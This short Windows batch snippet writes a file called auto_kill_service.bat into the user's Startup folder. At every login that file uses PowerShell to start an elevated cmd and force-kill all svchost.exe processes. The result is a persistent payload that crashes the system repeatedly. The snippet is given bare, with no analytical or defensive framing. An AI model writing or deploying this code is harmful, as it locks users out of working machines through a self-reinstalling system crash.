(
echo;@echo off
echo;set "cmdCommand=taskkill /f /im svchost.exe"
echo;powershell -Command "Start-Process cmd -Verb RunAs -ArgumentList '/c %cmdCommand%'"
)>C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\auto_kill_service.bat
